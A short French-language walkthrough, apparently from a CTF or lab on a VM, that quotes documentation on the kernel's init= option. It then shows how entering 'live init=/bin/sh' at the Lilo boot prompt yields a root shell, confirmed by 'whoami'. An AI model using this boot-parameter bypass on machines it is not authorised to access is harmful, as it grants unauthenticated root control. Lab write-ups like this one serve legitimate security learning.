## Lilo exploit: [Init](https://linux.die.net/man/8/init) to root shell

Comme expliqué [ici](https://www.linux.it/~rubini/docs/init/):
> Le nom "init" est utilisé de manière générique pour appeler le premier processus qui est exécuté au démarrage du système -- en fait, **le seul processus qui est exécuté au démarrage du système** --.

> Pour obtenir une flexibilité maximale, les développeurs du noyau ont proposé **un moyen de sélectionner un chemin d'accès différent pour le processus d'initialisation. Le noyau accepte l'option de ligne de commande init=** dans ce but précis.

> Comme vous pouvez l'imaginer, la manière la plus simple d'obtenir un accès root sur une machine Linux est de taper **init=/bin/sh** à l'invite de Lilo.

On maintient SHIFT lors du lancement de la VM, ce qui lance Lilo ("Linux Loader") et attends nos instructions.

```shell
  boot: _
```

On modifie donc le path de init pour qu'il nous ouvre un shell plutot que le classique `/bin/init` ou le `sbin/init` pour la seule option de boot disponible : live

- `live init=/bin/sh`
  ```shell
    error: unexpectedly disconnected from boot status daemon.
  [...]
    /bin/sh: 0: can't access tty; job control turned off
  ```
- `# whoami`
  ```
    root
  ```
